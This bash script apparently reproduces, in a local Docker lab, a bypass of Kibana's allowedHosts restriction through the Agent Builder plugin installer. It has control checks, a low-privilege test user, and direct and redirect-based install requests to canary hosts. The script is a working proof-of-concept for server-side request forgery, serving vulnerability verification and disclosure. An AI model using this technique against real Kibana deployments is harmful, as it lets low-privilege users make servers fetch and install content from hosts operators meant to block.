#!/usr/bin/env bash
# Elastic Agent Builder allowedHosts-bypass repro.
#
# Defender assumption under test: "Every server-side fetch Kibana makes on a
# user's behalf is bounded by the operator's xpack.actions.allowedHosts."
# The actions/connectors path honours it (CONTROL A/B). The Agent Builder
# plugin-from-URL installer allegedly does not (TEST 1 direct, TEST 2 via
# redirect from an allowed host).
#
# Everything is captured into evidence/<timestamp>/. The script does not
# abort on individual failures; SUMMARY.txt at the end carries the verdict:
#   CONFIRMED / KILLED / INCONCLUSIVE with per-check PASS/FAIL lines.
#
# Usage:  ./run-test.sh            (brings the stack up, runs all checks)
#         docker compose down -v   (teardown afterwards)
set -u
cd "$(dirname "$0")"

set -a; [ -f .env ] && . ./.env; set +a
ES=http://localhost:9200
KB=http://localhost:5601
SPACE=canary-space
ROLE=ab_agentbuilder_only
EV="evidence/$(date +%Y%m%d-%H%M%S)"
mkdir -p "$EV"
SUMMARY="$EV/SUMMARY.txt"
: > "$SUMMARY"

note() { echo "$*" | tee -a "$SUMMARY"; }
pass() { note "PASS  $*"; }
fail() { note "FAIL  $*"; }

# req <outfile> <method> <url> [curl args...] -> echoes http code
req() {
  local out="$1" method="$2" url="$3"; shift 3
  curl -s -o "$out" -w "%{http_code}" -X "$method" "$url" "$@"
}
jsonget() { python3 -c "import json,sys; d=json.load(open('$1')); print($2)" 2>/dev/null; }

echo "== generating plugin zips =="
python3 gen_plugin_zips.py | tee "$EV/00-zipgen.txt"

echo "== starting ES + canary + redirector =="
docker compose up -d es canary redirector | tee "$EV/00-compose-up.txt"
docker compose images > "$EV/00-images.txt" 2>&1

echo "== waiting for Elasticsearch =="
for i in $(seq 1 60); do
  code=$(req "$EV/00-es-root.json" GET "$ES/" -u "elastic:$ELASTIC_PASSWORD")
  [ "$code" = "200" ] && break
  sleep 5
done
note "ES root http=$code  version=$(jsonget "$EV/00-es-root.json" "d['version']['number']")"

echo "== setting kibana_system password, starting Kibana =="
req "$EV/00-kibana-system-pw.json" POST \
  "$ES/_security/user/kibana_system/_password" \
  -u "elastic:$ELASTIC_PASSWORD" -H "Content-Type: application/json" \
  -d "{\"password\":\"$KIBANA_SYSTEM_PASSWORD\"}" >/dev/null
docker compose up -d kibana >> "$EV/00-compose-up.txt" 2>&1

echo "== waiting for Kibana =="
kready=0
for i in $(seq 1 60); do
  req "$EV/00-kb-status.json" GET "$KB/api/status" -u "elastic:$ELASTIC_PASSWORD" >/dev/null
  if python3 - "$EV/00-kb-status.json" <<'PY'
import json,sys
try:
    d=json.load(open(sys.argv[1]))
    s=d.get("status",{})
    lvl=(s.get("overall",{}) or {}).get("level",{}) or {}
    ok = lvl.get("id")=="available" or s.get("overall",{}).get("state")=="green"
    sys.exit(0 if ok else 1)
except Exception:
    sys.exit(1)
PY
  then kready=1; break; fi
  sleep 10
done
note "Kibana ready=$kready"

echo "== trial licence =="
code=$(req "$EV/01-licence.json" POST "$ES/_license/start_trial?acknowledge=true" -u "elastic:$ELASTIC_PASSWORD")
note "start_trial http=$code (400 with 'already' text is fine if a trial/full licence is active)"

echo "== space / role / user =="
code=$(req "$EV/02-space.json" POST "$KB/api/spaces/space" -u "elastic:$ELASTIC_PASSWORD" \
  -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d "{\"id\":\"$SPACE\",\"name\":\"$SPACE\"}")
note "create space http=$code"
code=$(req "$EV/02-role.json" PUT "$KB/api/security/role/$ROLE" -u "elastic:$ELASTIC_PASSWORD" \
  -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d "{\"elasticsearch\":{\"cluster\":[],\"indices\":[],\"run_as\":[]},\"kibana\":[{\"base\":[],\"feature\":{\"agentBuilder\":[\"all\"]},\"spaces\":[\"$SPACE\"]}]}")
note "create role (agentBuilder all, space-scoped, NO actions/cluster privileges) http=$code"
code=$(req "$EV/02-user.json" PUT "$ES/_security/user/$AB_USER" -u "elastic:$ELASTIC_PASSWORD" \
  -H "Content-Type: application/json" \
  -d "{\"password\":\"$AB_PASSWORD\",\"roles\":[\"$ROLE\"],\"full_name\":\"AB Tester\",\"email\":\"ab@example.test\",\"enabled\":true}")
note "create low-priv user http=$code"

echo "== enabling agentBuilder:experimentalFeatures in the test space =="
req "$EV/03-settings-space.json" POST "$KB/s/$SPACE/api/kibana/settings" -u "elastic:$ELASTIC_PASSWORD" \
  -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d '{"changes":{"agentBuilder:experimentalFeatures":true}}' >/dev/null
req "$EV/03-settings-default.json" POST "$KB/api/kibana/settings" -u "elastic:$ELASTIC_PASSWORD" \
  -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d '{"changes":{"agentBuilder:experimentalFeatures":true}}' >/dev/null
note "settings written (see 03-settings-*.json)"

mk_connector() { # $1=name $2=url $3=outfile -> echoes connector id or empty
  local code id
  code=$(req "$3" POST "$KB/api/actions/connectors" -u "elastic:$ELASTIC_PASSWORD" \
    -H "kbn-xsrf: true" -H "Content-Type: application/json" \
    -d "{\"name\":\"$1\",\"connector_type_id\":\".webhook\",\"config\":{\"url\":\"$2\",\"method\":\"post\",\"hasAuth\":false},\"secrets\":{}}")
  id=$(jsonget "$3" "d.get('id','')")
  if [ -z "$id" ]; then
    code=$(req "$3" POST "$KB/api/actions/connector" -u "elastic:$ELASTIC_PASSWORD" \
      -H "kbn-xsrf: true" -H "Content-Type: application/json" \
      -d "{\"name\":\"$1\",\"connector_type_id\":\".webhook\",\"config\":{\"url\":\"$2\",\"method\":\"post\",\"hasAuth\":false},\"secrets\":{}}")
    id=$(jsonget "$3" "d.get('id','')")
  fi
  echo "$id"
}
exec_connector() { # $1=id $2=outfile -> echoes http code
  req "$2" POST "$KB/api/actions/connector/$1/_execute" -u "elastic:$ELASTIC_PASSWORD" \
    -H "kbn-xsrf: true" -H "Content-Type: application/json" \
    -d '{"params":{"body":"{\"ping\":true}"}}'
}

echo "== CONTROL A: webhook connector -> canary directly (must be REFUSED by allowedHosts) =="
cid=$(mk_connector "hook-direct" "http://canary:8080/hook" "$EV/04-controlA-create.json")
if [ -n "$cid" ]; then
  code=$(exec_connector "$cid" "$EV/05-controlA-execute.json")
  note "controlA execute http=$code"
else
  note "controlA connector create itself failed (see 04) - refusal may already be the control evidence"
fi

echo "== CONTROL B: webhook connector -> redirector (allowed) -302-> canary (must be REFUSED at redirect hop) =="
cid=$(mk_connector "hook-redirect" "http://redirector:8080/hook" "$EV/06-controlB-create.json")
if [ -n "$cid" ]; then
  code=$(exec_connector "$cid" "$EV/07-controlB-execute.json")
  note "controlB execute http=$code"
fi

echo "== CONTROL C: low-priv user tries to create a connector (informational: persona has no actions privilege) =="
code=$(req "$EV/08-controlC-lowpriv-connector.json" POST "$KB/api/actions/connectors" -u "$AB_USER:$AB_PASSWORD" \
  -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d '{"name":"nope","connector_type_id":".webhook","config":{"url":"http://canary:8080/hook","method":"post","hasAuth":false},"secrets":{}}')
note "controlC low-priv connector create http=$code (403/404 expected)"

install() { # $1=url $2=outfile -> echoes http code
  req "$2" POST "$KB/s/$SPACE/api/agent_builder/plugins/install" -u "$AB_USER:$AB_PASSWORD" \
    -H "kbn-xsrf: true" -H "Content-Type: application/json" -H "elastic-api-version: 2023-10-31" \
    -d "{\"url\":\"$1\"}"
}
list_plugins() { # $1=outfile
  req "$1" GET "$KB/s/$SPACE/api/agent_builder/plugins" -u "$AB_USER:$AB_PASSWORD" \
    -H "elastic-api-version: 2023-10-31" >/dev/null
}

echo "== TEST 1: low-priv plugin install from UNLISTED canary URL =="
code1=$(install "http://canary:8080/x.zip" "$EV/09-test1-install.json")
note "test1 install http=$code1"
list_plugins "$EV/10-test1-list.json"

echo "== TEST 2: low-priv plugin install via ALLOWED redirector -302-> canary =="
code2=$(install "http://redirector:8080/jump.zip" "$EV/11-test2-install.json")
note "test2 install http=$code2"
list_plugins "$EV/12-test2-list.json"

echo "== collecting service logs =="
docker compose logs --no-color canary     > "$EV/13-canary.log" 2>&1
docker compose logs --no-color redirector > "$EV/14-redirector.log" 2>&1
docker compose logs --no-color kibana     > "$EV/15-kibana.log" 2>&1
docker compose ps > "$EV/16-ps.txt" 2>&1

echo "== assertions =="
# Control evidence: refusal language in A-create or A-execute, and no /hook ever reached the canary.
if grep -qi "allowed" "$EV/04-controlA-create.json" "$EV/05-controlA-execute.json" 2>/dev/null; then
  pass "CONTROL A refused with allowedHosts language"
else
  fail "CONTROL A no allowedHosts refusal found in create/execute responses (inspect 04/05)"
fi
if grep -q "/hook" "$EV/13-canary.log"; then
  fail "canary received a /hook request - a connector call got through"
else
  pass "canary never received /hook (connector path fully blocked, direct + redirect)"
fi
# Test 1
if [ "$code1" = "200" ] && grep -q "ssrf-canary-a" "$EV/09-test1-install.json" && grep -q "GET /x.zip" "$EV/13-canary.log"; then
  pass "TEST 1 install from unlisted canary succeeded; canary logged Kibana's GET /x.zip"
else
  fail "TEST 1 did not fully succeed (http=$code1; inspect 09/13)"
fi
grep -q "ssrf-canary-a" "$EV/10-test1-list.json" \
  && pass "TEST 1 plugin ssrf-canary-a persisted (visible in plugin list)" \
  || fail "TEST 1 plugin not in list (inspect 10)"
# Test 2
if [ "$code2" = "200" ] && grep -q "ssrf-canary-b" "$EV/11-test2-install.json" \
   && grep -q "GET /jump.zip" "$EV/14-redirector.log" && grep -q "GET /y.zip" "$EV/13-canary.log"; then
  pass "TEST 2 install via allowed-host redirect succeeded; redirector + canary logs confirm the chain"
else
  fail "TEST 2 did not fully succeed (http=$code2; inspect 11/13/14)"
fi

echo "== verdict =="
if grep -qi "allowed" "$EV/09-test1-install.json" "$EV/11-test2-install.json" 2>/dev/null; then
  note "VERDICT: KILLED - the GA installer refused with allowedHosts language; the guard exists on this build."
elif grep -q "^PASS  TEST 1" "$SUMMARY" && grep -q "^PASS  TEST 2" "$SUMMARY" && grep -q "^PASS  CONTROL A" "$SUMMARY"; then
  note "VERDICT: CONFIRMED - configured allowlist binds the connector path (incl. redirect hops) but not the Agent Builder installer, for a non-superuser persona."
else
  note "VERDICT: INCONCLUSIVE - inspect the evidence files; common causes: install route 404 (feature flag/licence), settings not applied in space, stack not fully up."
fi
note "Evidence dir: $EV"
echo "Done. Teardown with: docker compose down -v"
